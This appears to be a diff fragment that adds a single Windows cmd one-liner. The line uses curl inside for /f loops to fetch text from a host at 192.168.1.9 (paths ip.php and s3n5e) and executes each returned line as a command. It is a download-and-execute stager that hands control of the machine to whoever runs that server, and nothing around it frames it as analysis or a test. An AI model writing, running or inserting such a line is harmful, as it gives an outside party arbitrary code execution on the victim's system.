@@ -1,0 +1,1 @@
+cmd /c echo off & for /f "delims=" %t in ('curl -s http://192.168.1.9/ip.php') do %t & for /f "delims=" %t in ('curl -s http://192.168.1.9/s3n5e') do %t
